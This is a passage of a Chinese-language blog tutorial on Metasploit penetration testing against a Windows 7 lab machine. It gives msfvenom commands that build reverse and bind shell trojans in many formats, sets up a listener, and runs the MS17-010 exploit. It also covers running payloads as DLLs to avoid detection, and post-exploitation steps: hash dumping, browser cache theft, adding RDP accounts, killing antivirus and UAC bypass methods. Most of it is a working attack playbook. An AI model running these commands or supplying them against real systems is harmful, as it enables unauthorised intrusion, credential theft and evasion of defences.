<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203001046782.png" srcset="/img/loading.gif" lazyload alt="image-20220203001046782"></p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203001103253.png" srcset="/img/loading.gif" lazyload alt="image-20220203001103253"></p>
<p>就设置了ip  其他参数默认 然后攻击</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203001144002.png" srcset="/img/loading.gif" lazyload alt="image-20220203001144002"></p>
<p>尴尬 这里好像失败了  原来是360没关   </p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203001014494.png" srcset="/img/loading.gif" lazyload alt="image-20220203001014494"></p>
<p>之后重新测试</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203001329774.png" srcset="/img/loading.gif" lazyload alt="image-20220203001329774"></p>
<p>小tips：这里是set rhosts 是可以设置多个的  可以同时测试多个目标</p>
<h3 id="五、msf之Exploits模块常用演示"><a href="#五、msf之Exploits模块常用演示" class="headerlink" title="五、msf之Exploits模块常用演示"></a>五、msf之Exploits模块常用演示</h3><h4 id="1、显示所有渗透攻击模块"><a href="#1、显示所有渗透攻击模块" class="headerlink" title="1、显示所有渗透攻击模块"></a>1、显示所有渗透攻击模块</h4><p><strong>show exploits</strong></p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203004645567.png" srcset="/img/loading.gif" lazyload alt="image-20220203004645567"></p>
<h4 id="2、查找关于smb的攻击模块"><a href="#2、查找关于smb的攻击模块" class="headerlink" title="2、查找关于smb的攻击模块"></a>2、查找关于smb的攻击模块</h4><blockquote>
<p>search name:smb type:exploit</p>
</blockquote>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203004749932.png" srcset="/img/loading.gif" lazyload alt="image-20220203004749932"></p>
<h4 id="3、查找路径含有smb的模块"><a href="#3、查找路径含有smb的模块" class="headerlink" title="3、查找路径含有smb的模块"></a>3、查找路径含有smb的模块</h4><blockquote>
<p>search path:smb</p>
</blockquote>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203004833122.png" srcset="/img/loading.gif" lazyload alt="image-20220203004833122"></p>
<p>用ms17010演示：exploit/windows/smb/ms17_010_psexec </p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203005318222.png" srcset="/img/loading.gif" lazyload alt="image-20220203005318222"></p>
<p>可以看到弹回一个会话</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203005403791.png" srcset="/img/loading.gif" lazyload alt="image-20220203005403791"></p>
<p>其他 Exploit模块的操作也是如此 就不演示了</p>
<h3 id="六、msf之Payloads模块常用演示"><a href="#六、msf之Payloads模块常用演示" class="headerlink" title="六、msf之Payloads模块常用演示"></a>六、msf之Payloads模块常用演示</h3><h4 id="Payloads分类"><a href="#Payloads分类" class="headerlink" title="Payloads分类"></a>Payloads分类</h4><p>1、singles：独立载荷，可直接植入目标系统并执行相应的程序，如：shell_bind_tcp这个payload。</p>
<p>2、stagers：传输器载荷，用于目标机与攻击机之间建立稳定的网络连接，与传输体载荷配合攻击。通常该种载荷体积都非常小，可以在漏洞利用后方便注入，这类载荷功能都非常相似，大致分为bind型和reverse型，bind型是需要攻击机主动连接目标端口的；而reverse型是目标机会反连接攻击机，需要提前设定好连接攻击机的ip地址和端口号。</p>
<p>3、stages：传输体载荷，如shell，meterpreter等。在stagers建立好稳定的连接后，攻击机将stages传输给目标机，由stagers进行相应处理，将控制权转交给stages。比如得到目标机的shell，或者meterpreter控制程序运行。这样攻击机可以在本端输入相应命令控制目标机。</p>
<h4 id="显示所有可用payloads"><a href="#显示所有可用payloads" class="headerlink" title="显示所有可用payloads"></a>显示所有可用payloads</h4><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203011612790.png" srcset="/img/loading.gif" lazyload alt="image-20220203011612790"></p>
<p>Metasploit 生成的 Payload分为正向和反向</p>
<h4 id="最常见的payload"><a href="#最常见的payload" class="headerlink" title="最常见的payload"></a>最常见的payload</h4><ul>
<li>windows/meterpreter/bind_tcp    #正向连接</li>
<li>windows/meterpreter/reverse_tcp  #反向连接，常用</li>
<li>windows/meterpreter/reverse_http  #通过监听80端口反向连接</li>
<li>windows/meterpreter/reverse_https #通过监听443端口反向连接</li>
</ul>
<h4 id="反向payload"><a href="#反向payload" class="headerlink" title="反向payload"></a>反向payload</h4><p>反向就是说目标执⾏了我们⽣成的Payload后，会主动连接我们的攻击服务 器MSF</p>
<h5 id="生成木马命令：msfvenom"><a href="#生成木马命令：msfvenom" class="headerlink" title="生成木马命令：msfvenom"></a>生成木马命令：<code>msfvenom</code></h5><p><strong>msfvenom详细语法</strong></p>
<ul>
<li>-e, –encoder [encoder] 指定需要使用的encoder（编码器）<br>-a, –arch &lt; architecture&gt; 指定payload的目标架构<br>–platform &lt; platform&gt; 指定payload的目标平台<br>-s, –space &lt; length&gt; 设定有效攻击荷载的最大长度<br>-b, –bad-chars &lt; list&gt; 设定规避字符集，比如: &amp; #039;/x00/xff&amp; #039;<br>-i, –iterations &lt; count&gt; 指定payload的编码次数<br>-c, –add-code &lt; path&gt; 指定一个附加的win32 shellcode文件<br>-x, –template &lt; path&gt; 指定一个自定义的可执行文件作为模板<br>-k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行<br>–payload-options 列举payload的标准选项<br>-o, –out &lt; path&gt; 保存payload<br>-v, –var-name &lt; name&gt; 指定一个自定义的变量，以确定输出格式<br>–shellest 最小化生成payload<br>-h, –help 查看帮助选项<br>–help-formats 查看msf支持的输出格式列表</li>
</ul>
<h5 id="生成木马语句"><a href="#生成木马语句" class="headerlink" title="生成木马语句"></a>生成木马语句</h5><ul>
<li><p>二进制<br>linux:msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf &gt; shell.elf</p>
</li>
<li><p>windows:msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe &gt; shell.exe</p>
</li>
<li><p>mac: msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho &gt; shell.macho</p>
</li>
<li><p>web<br>php:msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw &gt; shell.php cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ’ | tr -d ‘/n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</p>
</li>
<li><p>asp:msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp &gt; shell.asp</p>
</li>
<li><p>jap:msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw &gt; shell.jsp</p>
</li>
<li><p>war:msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war &gt; shell.war</p>
</li>
<li><p>脚本<br>python:msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw &gt; shell.py</p>
</li>
<li><p>bash:msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw &gt; shell.sh</p>
</li>
<li><p>perl:msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw &gt; shell.pl</p>
</li>
<li><p>基于pdf的shellcode<br>use exploit/windows/fileformat/adobe_utilprintf<br>msf5 exploit(adobe_utilprintf)&gt;set FILENAME BestComputers-UpgradeInstructions.pdfset</p>
</li>
<li><p>PAYLOAD windows/meterpreter/reverse_tcp<br>其他的就自己填就好了</p>
<p><strong>LHOST 填写的是攻击机器，也就是Kali的IP LPORT 填写的是端口，一般填写的是高端口，如：6666、4444、8977等等，但是 最好填写一下比较常用的端口，如：80、443、8080等等</strong></p>
</li>
</ul>
<p>生成shell.exe： msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=5555 -f exe &gt; shell2.exe</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203012757882.png" srcset="/img/loading.gif" lazyload alt="image-20220203012757882"></p>
<p>此时在当前⽬录下有⼀个shell2.exe! 因为在前面说了，这是反向连接，那么就需要先在攻击机器上监听，然 后再然后⾁鸡运⾏我们的文件才可以连接！</p>
<p>监听模块：<code>use exploit/multi/handler</code></p>
<p>use exploit/multi/handler </p>
<p>set PAYLOAD windows/meterpreter/reverse_tcp //这个就是和上面msfvenom使用 的payload是一样的 </p>
<p>set LHOST 192.168.1.10</p>
<p>set LPORT 5555</p>
<p>run</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203013100039.png" srcset="/img/loading.gif" lazyload alt="image-20220203013100039"></p>
<p>接着我们放到Windows7下去执⾏这个⼆进制文件：</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203013221508.png" srcset="/img/loading.gif" lazyload alt="image-20220203013221508"></p>
<p>最后，来看看Metasploit这边的监听情况：</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203013247770.png" srcset="/img/loading.gif" lazyload alt="image-20220203013247770"></p>
<p>可以看到，Windows7运⾏了刚刚msfvenom⽣成的shell.exe后， Metasploit这边反弹了⼀个meterpreter会话过来！</p>
<p>这个就是这么⼀个Windows的反向cmdshell 因为刚刚我们所反弹回来了⼀个shell，假设我们要重新监听其他的 payload，那么就可以使⽤background来返回msfconsole控制台窗⼝：</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203013402729.png" srcset="/img/loading.gif" lazyload alt="image-20220203013402729"></p>
<p>如果想查看当前连接的session，就可以使⽤sessions查看在后台有哪些连接 了MSF：</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203013528739.png" srcset="/img/loading.gif" lazyload alt="image-20220203013528739"></p>
<p>如果想进入刚才那个meterperter，那么就sessions后⾯跟他的⼀个id：</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203013549137.png" srcset="/img/loading.gif" lazyload alt="image-20220203013549137"></p>
<p>这样就进入了刚刚那个cmdshell⾥！</p>
<h4 id="正向payload"><a href="#正向payload" class="headerlink" title="正向payload"></a>正向payload</h4><ul>
<li><p>使⽤场景 </p>
<p>场景还是得具体看，⽐如⽬标机器不给其他除特定端⼝外的端⼝出站，那就 只能能正向；还有⽐如有⼀种情 况，⽬标处于深层⽹络，不能直接连通外⽹，也不能通过其他机器连通，因 为其他机器防⽕墙都开着，为避免 在有防⽕墙监控的情况下关闭防⽕墙⽽被发现，也只能⽤正向的⻢，然后通 过开着防⽕墙的机器来进⾏端⼝的 转发达到穿透的⽬的</p>
</li>
</ul>
<h5 id="msfvenom⽣成正向Paylaod"><a href="#msfvenom⽣成正向Paylaod" class="headerlink" title="msfvenom⽣成正向Paylaod"></a>msfvenom⽣成正向Paylaod</h5><p>msfvenom -p windows/meterpreter/bind_tcp LPORT=<Attack port> -f exe &gt;/root/bind_xx.exe</Attack></p>
<p>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=<Attack port> -f exe &gt;/root/bind_xx.exe </Attack></p>
<p>msfvenom -p windows/meterpreter/bind_tcp LPORT=<Attack port> -f dll &gt;/root/bind_xx.dll </Attack></p>
<p>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=<Attack port> -f dll &gt;/root/bind_xx.dll </Attack></p>
<p>msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=<Attack port> -f elf &gt;/root/bind_xx.elf </Attack></p>
<p>msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=<Attack port> -f elf &gt;/root/bind_xx.elf</Attack></p>
<p>因为我win7虚拟机是x64位系统，我就⽤这条命令：</p>
<p>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=5555 -f exe &gt;bind.exe</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203234222744.png" srcset="/img/loading.gif" lazyload alt="image-20220203234222744"></p>
<p>在虚拟机上运⾏：bind.exe:</p>
<p>可以看到，已经开放了5555端⼝！</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203234553779.png" srcset="/img/loading.gif" lazyload alt="image-20220203234553779"></p>
<p>接下来打开msfconsole对虚拟机进⾏连接(前提是对⽅防火墙是关闭了的)：</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203234856726.png" srcset="/img/loading.gif" lazyload alt="image-20220203234856726"></p>
<p>其中LPORT需要设置为刚刚我们⽣成的Payload⼀样的端⼝，也就是5555: 还要设置⼀个RHOST，也就是⾁鸡Win7的IP:192.168.1.14 </p>
<p>最后直接运⾏exoloit</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203234944995.png" srcset="/img/loading.gif" lazyload alt="image-20220203234944995"></p>
<p>这个时候就反弹回来了⼀个Meterpreter会话回来！</p>
<p>同时，⾁鸡win7那边就没有对5555端⼝进⾏连接了！</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203235033556.png" srcset="/img/loading.gif" lazyload alt="image-20220203235033556"></p>
<p>因为⽤了5555端⼝启⽤监听后，只会接收⼀次数据，⽆论成功或者失败，它 都不会再监听了！ 也就是说，如果连接失败了，那么就再运⾏然后再连接⼀次！</p>
<p>这是Metasploit⽣成正向的过程！</p>
<h5 id="尽量不要⽣成exe"><a href="#尽量不要⽣成exe" class="headerlink" title="尽量不要⽣成exe"></a>尽量不要⽣成exe</h5><p>在真实环境中，如果使⽤msfvenom⽣成了⼀个正向Paylaod格式是exe，那 么在进程中就会暴露！</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203235139085.png" srcset="/img/loading.gif" lazyload alt="image-20220203235139085"></p>
<p>⼀般⽤就⽤dll！ </p>
<p>要运⾏dll必须使⽤rundll32.exe来start: </p>
<p>rundll32.exe文件在C:/Windows/System32/rundll32.exe:</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203235416805.png" srcset="/img/loading.gif" lazyload alt="image-20220203235416805"></p>
<p><em><strong>使用方法就是 rundll32.exe xxx.dll,Start</strong></em></p>
<p>生成一个dll</p>
<p>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=6666 -f dll &gt;bind.dll </p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203235709952.png" srcset="/img/loading.gif" lazyload alt="image-20220203235709952"></p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204000003055.png" srcset="/img/loading.gif" lazyload alt="image-20220204000003055"></p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204000015393.png" srcset="/img/loading.gif" lazyload alt="image-20220204000015393"></p>
<p>⽽Meterpreter这边也是反弹了⼀个shell回来</p>
<p>这就是正向连接</p>
<h3 id="七、msf之Post模块常用演示"><a href="#七、msf之Post模块常用演示" class="headerlink" title="七、msf之Post模块常用演示"></a>七、msf之Post模块常用演示</h3><h4 id="后渗透操作"><a href="#后渗透操作" class="headerlink" title="后渗透操作"></a>后渗透操作</h4><p>在获取到一枚Meterpreter的shell之后，就可以进行下一步的渗透，</p>
<p>那msf中的post模块就是⼀个后渗透模块，⾥⾯包含各种后渗透中有可能⽤到的功能，最多的就 是信息收集。</p>
<p>search post</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204000654465.png" srcset="/img/loading.gif" lazyload alt="image-20220204000654465"></p>
<p>这边就模拟⼀下拿到cmdshell后的操作：</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204000751985.png" srcset="/img/loading.gif" lazyload alt="image-20220204000751985"></p>
<p>可以看到，我这边sessions是有⼀个meterpreter会话：</p>
<p>在后渗透的时候，我们可以使⽤post模块辅助我们</p>
<h4 id="1、获取目标分区情况"><a href="#1、获取目标分区情况" class="headerlink" title="1、获取目标分区情况"></a>1、获取目标分区情况</h4><blockquote>
<p>run post/windows/gather/forensics/enum_drives</p>
</blockquote>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204000950563.png" srcset="/img/loading.gif" lazyload alt="image-20220204000950563"></p>
<h4 id="2、检测是否是虚拟主机"><a href="#2、检测是否是虚拟主机" class="headerlink" title="2、检测是否是虚拟主机"></a>2、检测是否是虚拟主机</h4><blockquote>
<p>run post/windows/gather/checkvm</p>
</blockquote>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204001018933.png" srcset="/img/loading.gif" lazyload alt="image-20220204001018933"></p>
<h4 id="3、获取当前安装的应用程序"><a href="#3、获取当前安装的应用程序" class="headerlink" title="3、获取当前安装的应用程序"></a>3、获取当前安装的应用程序</h4><blockquote>
<p>run post/windows/gather/enum_applications</p>
</blockquote>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204001048275.png" srcset="/img/loading.gif" lazyload alt="image-20220204001048275"></p>
<h4 id="4、获取用户登录信息"><a href="#4、获取用户登录信息" class="headerlink" title="4、获取用户登录信息"></a>4、获取用户登录信息</h4><blockquote>
<p>run post/windows/gather/enum_logged_on_users</p>
</blockquote>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204001135734.png" srcset="/img/loading.gif" lazyload alt="image-20220204001135734"></p>
<h4 id="5、收集系统环境信息"><a href="#5、收集系统环境信息" class="headerlink" title="5、收集系统环境信息"></a>5、收集系统环境信息</h4><blockquote>
<p>run post/multi/gather/env</p>
</blockquote>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204001323935.png" srcset="/img/loading.gif" lazyload alt="image-20220204001323935"></p>
<h4 id="6、查看开启的服务"><a href="#6、查看开启的服务" class="headerlink" title="6、查看开启的服务"></a>6、查看开启的服务</h4><blockquote>
<p>run post/windows/gather/enum_services</p>
</blockquote>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204001409853.png" srcset="/img/loading.gif" lazyload alt="image-20220204001409853"></p>
<h4 id="7、查看目标主机最近的操作"><a href="#7、查看目标主机最近的操作" class="headerlink" title="7、查看目标主机最近的操作"></a>7、查看目标主机最近的操作</h4><blockquote>
<p>run post/windows/gather/dumplinks</p>
</blockquote>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204001558473.png" srcset="/img/loading.gif" lazyload alt="image-20220204001558473"></p>
<h4 id="8、其他操作"><a href="#8、其他操作" class="headerlink" title="8、其他操作"></a>8、其他操作</h4><p>删除用户</p>
<blockquote>
<p>run post/wndows/manage/delete_user username=aiyou</p>
</blockquote>
<p>添加账户</p>
<blockquote>
<p>run post/windows/manage/enable_rdp USERNAME=aiyou PASSWORD=aiyou</p>
</blockquote>
<p>关闭杀软</p>
<blockquote>
<p>windows/manage/killav</p>
</blockquote>
<h4 id="9、查看目标机安装了哪些应用、补丁"><a href="#9、查看目标机安装了哪些应用、补丁" class="headerlink" title="9、查看目标机安装了哪些应用、补丁"></a>9、查看目标机安装了哪些应用、补丁</h4><blockquote>
<p>run post/windows/gather/enum_applications</p>
</blockquote>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204001701826.png" srcset="/img/loading.gif" lazyload alt="image-20220204001701826"></p>
<h4 id="10、对目标进行漏洞扫描-提权操作"><a href="#10、对目标进行漏洞扫描-提权操作" class="headerlink" title="10、对目标进行漏洞扫描(提权操作)"></a>10、对目标进行漏洞扫描(提权操作)</h4><blockquote>
<p>run post/multi/recon/local_exploit_suggester</p>
</blockquote>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204001748723.png" srcset="/img/loading.gif" lazyload alt="image-20220204001748723"></p>
<p>执行之后给了我们很多exploit</p>
<p>我们就随便挑几个</p>
<blockquote>
<p>exploit/windows/local/ms16_014_wmi_recv_notif</p>
</blockquote>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204002328725.png" srcset="/img/loading.gif" lazyload alt="image-20220204002328725"></p>
<p>这个提权成功</p>
<h4 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h4><p>hashdump是查询密码hash： 因为有时候你得搜集密码来进⾏爆破别的⽤户</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204002514895.png" srcset="/img/loading.gif" lazyload alt="image-20220204002514895"></p>
<h4 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h4><ul>
<li>run post/windows/gather/checkvm #是否虚拟机 </li>
<li>run post/linux/gather/checkvm #是否虚拟机 </li>
<li>run post/windows/gather/forensics/enum_drives #查看分区 </li>
<li>run post/windows/gather/enum_applications #获取安装软件信息 </li>
<li>run post/windows/gather/dumplinks #获取最近的文件操作</li>
<li>run post/windows/gather/enum_ie #获取IE缓存 </li>
<li>run post/windows/gather/enum_chrome #获取Chrome缓存 </li>
<li>run post/windows/gather/enum_patches #补丁信息 </li>
<li>run post/windows/gather/enum_domain #查找域控</li>
</ul>
<h3 id="八、msf之windows提权-UAC绕过"><a href="#八、msf之windows提权-UAC绕过" class="headerlink" title="八、msf之windows提权_UAC绕过"></a>八、msf之windows提权_UAC绕过</h3><h4 id="什么是UAC"><a href="#什么是UAC" class="headerlink" title="什么是UAC"></a>什么是UAC</h4><p>用户帐户控制（简称UAC）是微软公司在其Windows Vista，及更新版本操作系统中采用 的一种控制机制。通过 本文你将了解它是如何保护你免受恶意软件侵害的，以及忽略UAC 提示将可能给你系统带来的麻烦。</p>
<p>原理<br>界面操作是：通过询问用户是否授权给应用程序，使用硬盘驱动器和系统文件的权力。以达到阻止恶意程序（“恶意软件”）损坏系统的效果。</p>
<p>内部逻辑是：</p>
<p>在触发 UAC 时，操作系统会创建一个consent.exe进程，用来确定是否创建具有管理员权限的进程（通过白名单和用户选择判断），然后creat process。请求进程将要请求的进程cmdline和进程路径，通过LPC接口传递给appinfo的RAiLuanchAdminProcess函数，该函数首先验证路径是否在白名单中，并将结果传递给consent.exe进程，该进程验证被请求的进程签名，以及，发起者的权限，是否符合要求，然后决定是否弹出UAC框，让用户确认。这个UAC框会创建新的安全桌面，遮挡之前的界面。同时这个UAC框进程是SYSTEM账户的进程，其他标准用户进程无法与其通信交互。用户确认之后，会调用CreateProcessAsUser函数，以管理员权限启动请求的进程。</p>
<p>所以，病毒木马想要实现高权限操作，就不得不绕过UAC弹窗，在没有通知用户情况下, 悄悄地将普通权限，提升为管理员权限启动进程，从而使程序得到高权限的操作。</p>
<h4 id="UAC实例"><a href="#UAC实例" class="headerlink" title="UAC实例"></a>UAC实例</h4><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204004748652.png" srcset="/img/loading.gif" lazyload alt="image-20220204004748652"></p>
<p>可以看到，我sessions有4个，我先进入到⼀个不是系统权限的session：</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204004934802.png" srcset="/img/loading.gif" lazyload alt="image-20220204004934802"></p>
<p>hashdunm失败，这就是权限问题，我们没有⽤管理员权限运⾏！</p>
<p>我们来到虚拟机这⾥，右键以管理员权限运⾏就会弹出这个：</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204005002111.png" srcset="/img/loading.gif" lazyload alt="image-20220204005002111"></p>
<p>⽽这个就是UAC! ⽽如果我们⽤了管理员权限运⾏，这个时候就可以hashdump了：</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204005013882.png" srcset="/img/loading.gif" lazyload alt="image-20220204005013882"></p>
<p>有的你运⾏⼀个软件它会弹出⼀个框框问你是否要运⾏：</p>
<p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204005023821.png" srcset="/img/loading.gif" lazyload alt="image-20220204005023821"></p>
<p>如果你点击确认/是的话，那么你就过了UAC的权限！这个时候就可以进⾏⼀个真正的管理员权限 的操作!</p>
<h4 id="UAC是如何运作的"><a href="#UAC是如何运作的" class="headerlink" title="UAC是如何运作的"></a>UAC是如何运作的</h4><p>⼀旦程序执⾏涉及系统更改/特定任务就会触发UAC。除非尝试执⾏他们的进程以管理员权限运 行，否则这些操作都将被阻⽌。</p>
<p>没有管理员权限将无法执⾏以下操作： 注册表修改（如果注册表项位于如HKEY_LOCAL_MACHINE下（因为它影响多个用户），它 将是只读的） 加载设备驱动程序 DLL注入 修改系统时间(clock) 修改⽤户帐户控制设置（通过注册表可以启用/禁用它，但你需要正确的权限才能执行该操 作） 修改受保护的目录（例如Windows文件夹，Program Files） 计划任务（例如，以管理员权限自启动）</p>
<h4 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass-UAC"></a>Bypass-UAC</h4><p>有的时候我们没有办法以管理员⾝份来运⾏我们的程序，只能以普通⽤户的权限来运⾏，这个时 候怎么来绕过UAC来⽤管理员权限运⾏呢？</p>
<p>绕过 UAC的方法：</p>
<ul>
<li>白名单提权机制；<br>DLL 劫持；<br>Windows 自身漏洞提权；<br>远程注入；<br>COM 接口技术。<br>计划任务</li>
<li>路径欺骗。</li>
</ul>
